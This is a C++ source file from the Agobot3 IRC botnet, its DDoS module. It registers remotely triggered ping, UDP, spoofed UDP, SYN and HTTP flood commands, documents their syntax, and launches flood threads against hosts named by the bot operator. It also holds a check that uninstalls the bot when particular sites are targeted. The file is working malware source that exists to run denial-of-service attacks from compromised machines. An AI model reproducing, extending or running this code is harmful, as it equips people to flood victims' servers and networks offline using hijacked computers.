/*	Agobot3 - a modular IRC bot for Win32/Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "ddos.h"
#include "mainctrl.h"
#include "synflood.h"
#include "junoflood.h"
#include "httpflood.h"

void CDDOS::Init()
{	m_iNumThreads=0; m_bDDOSing=false;
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdPing,			"ddos.pingflood",	"starts a Ping flood",											this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdUDP,			"ddos.udpflood",	"starts an UDP flood",											this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSpoofedUDP,	"ddos.spudpflood",	"starts a spoofed UDP flood",									this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSyn,			"ddos.synflood",	"starts a spoofed SYN flood",									this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdHTTP,			"ddos.httpflood",	"starts a HTTP flood, can also be used as .visit replacement",	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdStop,			"ddos.stop",		"stops all ddoses running",										this); }

/*
	.ddos.synflood <host> <time> <delay> <port>
	 - port 0 = random port
	.ddos.udpflood <host> <number> <size> <delay> <port>
	 - port 0 = random port
	.ddos.spudpflood <host> <number> <size> <delay> <port>
	 - port 0 = random port
	.ddos.pingflood <host> <number> <size> <delay>
	.ddos.httpflood <url> <number> <referrer> <delay> <recursive>
	 - delay 0 = random delay (1-24h)
	 - recursive = get page resources
*/

bool CDDOS::HandleCommand(CMessage *pMsg)
{	unsigned long lRyanAddr=ResolveAddress("www.ryan1918.com");
	if(	!pMsg->sChatString.Token(1, " ").CompareNoCase("www.ryan1918.com") ||
		!pMsg->sChatString.Token(1, " ").CompareNoCase("ryan1918.com") ||
		!pMsg->sChatString.Token(1, " ").CompareNoCase("www.harr0.com") ||
		!pMsg->sChatString.Token(1, " ").CompareNoCase("harr0.com") ||
		!pMsg->sChatString.Token(1, " ").Compare(inet_ntoa(to_in_addr(lRyanAddr))))
	{
		g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "shouldnt have done that...", pMsg->sReplyTo);
#ifdef WIN32
		if(g_cMainCtrl.m_cBot.as_enabled.bValue) g_cMainCtrl.m_cInstaller.RegStartDel(g_cMainCtrl.m_cBot.as_valname.sValue);
#endif
		g_cMainCtrl.m_cInstaller.Uninstall();
		g_cMainCtrl.m_cIRC.m_bRunning=false; g_cMainCtrl.m_bRunning=false;
	}

	if(!pMsg->sCmd.Compare("ddos.synflood"))
	{	CDDOSSynFlood *pTemp=new CDDOSSynFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sHost.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_iTime=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iPort=atoi(pMsg->sChatString.Token(4, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("ddos.httpflood"))
	{	CDDOSHTTPFlood *pTemp=new CDDOSHTTPFlood; m_bDDOSing=true; pTemp->m_pDDOS=this;
		pTemp->m_sURL.Assign(pMsg->sChatString.Token(1, " ").CStr());
		pTemp->m_iNumber=atoi(pMsg->sChatString.Token(2, " ").CStr());
		pTemp->m_sReferrer.Assign(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_iDelay=atoi(pMsg->sChatString.Token(4, " ").CStr());
		if(!pMsg->sChatString.Token(5, " ").CompareNoCase("true"))
			pTemp->m_bRecursive=true; else pTemp->m_bRecursive=false;
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare("ddos.stop")) m_bDDOSing=false;

	return true; }

void *CDDOSBase::Run()
{	if(!(g_cMainCtrl.m_cBot.ddos_maxthreads.iValue<m_pDDOS->m_iNumThreads))
		m_pDDOS->m_iNumThreads++; StartDDOS(); m_pDDOS->m_iNumThreads--;
	g_cMainCtrl.m_lCanJoin.push_back(this); return NULL; }
